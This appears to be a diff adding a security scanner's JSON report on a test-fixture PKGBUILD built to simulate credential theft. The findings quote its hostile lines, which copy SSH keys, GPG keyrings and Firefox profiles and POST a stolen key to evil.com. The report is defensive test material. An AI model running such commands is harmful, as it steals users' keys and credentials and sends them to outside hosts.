@@ -1,0 +1,190 @@
+{
+  "package_name": "malicious-credential-theft",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "CRED-001",
+      "severity": "critical",
+      "category": "credential_theft",
+      "title": "SSH key access",
+      "description": "Accessing SSH private keys during build/install",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": 14,
+        "column": 9,
+        "snippet": "    cat ~/.ssh/id_rsa > /tmp/stolen_key"
+      },
+      "recommendation": "Package should never access user SSH keys",
+      "cwe_id": "CWE-522",
+      "metadata": {
+        "matched_text": "~/.ssh/"
+      }
+    },
+    {
+      "id": "CRED-002",
+      "severity": "critical",
+      "category": "credential_theft",
+      "title": "GPG key access",
+      "description": "Accessing GPG keyring during build/install",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": 17,
+        "column": 30,
+        "snippet": "    tar -czf /tmp/gpg.tar.gz ~/.gnupg/"
+      },
+      "recommendation": "Package should never access user GPG keys",
+      "cwe_id": "CWE-522",
+      "metadata": {
+        "matched_text": "~/.gnupg/"
+      }
+    },
+    {
+      "id": "BROWSER-001",
+      "severity": "critical",
+      "category": "credential_theft",
+      "title": "Browser profile access",
+      "description": "Accessing browser profiles may indicate credential theft",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": 20,
+        "column": 13,
+        "snippet": "    cp -r ~/.mozilla/firefox /tmp/firefox_profile"
+      },
+      "recommendation": "Package should never access browser profiles",
+      "cwe_id": "CWE-522",
+      "metadata": {
+        "matched_text": ".mozilla/firefox"
+      }
+    },
+    {
+      "id": "EXFIL-001",
+      "severity": "critical",
+      "category": "data_exfiltration",
+      "title": "Curl POST data exfiltration",
+      "description": "Sending data to external servers via curl POST",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": 23,
+        "column": 5,
+        "snippet": "    curl -X POST -d @/tmp/stolen_key https://evil.com/collect"
+      },
+      "recommendation": "Build/install should not send data externally",
+      "cwe_id": "CWE-200",
+      "metadata": {
+        "matched_text": "curl -X POST -d "
+      }
+    },
+    {
+      "id": "EXFIL-001",
+      "severity": "critical",
+      "category": "data_exfiltration",
+      "title": "Curl POST data exfiltration",
+      "description": "Sending data to external servers via curl POST",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": 23,
+        "column": 5,
+        "snippet": "    curl -X POST -d @/tmp/stolen_key https://evil.com/collect"
+      },
+      "recommendation": "Build/install should not send data externally",
+      "cwe_id": "CWE-200",
+      "metadata": {
+        "matched_text": "curl -X POST"
+      }
+    },
+    {
+      "id": "HIDDEN-001",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "Hidden file creation in home",
+      "description": "Creating hidden files in user home directory",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": 14,
+        "column": 9,
+        "snippet": "    cat ~/.ssh/id_rsa > /tmp/stolen_key"
+      },
+      "recommendation": "Packages should not create hidden files in user home",
+      "cwe_id": null,
+      "metadata": {
+        "matched_text": "~/.ssh"
+      }
+    },
+    {
+      "id": "HIDDEN-001",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "Hidden file creation in home",
+      "description": "Creating hidden files in user home directory",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": 17,
+        "column": 30,
+        "snippet": "    tar -czf /tmp/gpg.tar.gz ~/.gnupg/"
+      },
+      "recommendation": "Packages should not create hidden files in user home",
+      "cwe_id": null,
+      "metadata": {
+        "matched_text": "~/.gnupg"
+      }
+    },
+    {
+      "id": "HIDDEN-001",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "Hidden file creation in home",
+      "description": "Creating hidden files in user home directory",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": 20,
+        "column": 11,
+        "snippet": "    cp -r ~/.mozilla/firefox /tmp/firefox_profile"
+      },
+      "recommendation": "Packages should not create hidden files in user home",
+      "cwe_id": null,
+      "metadata": {
+        "matched_text": "~/.mozilla"
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'build' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": 12,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "build",
+        "pattern": "curl"
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/credential-theft/PKGBUILD"
+  ],
+  "timestamp": "2026-06-15T13:48:49.130161421Z",
+  "scan_duration_ms": 6
+}
